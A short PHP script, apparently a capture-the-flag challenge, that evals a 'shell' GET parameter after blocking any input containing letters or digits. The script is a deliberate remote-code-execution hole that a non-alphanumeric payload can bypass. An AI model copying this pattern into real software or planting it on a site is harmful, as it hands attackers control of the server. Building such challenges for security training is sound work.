<?php
$shell = $_GET['shell'] ?? '';
if (preg_match('/[A-Za-z0-9]/', $shell)) {
    die('blocked');
}
eval($shell);
?>
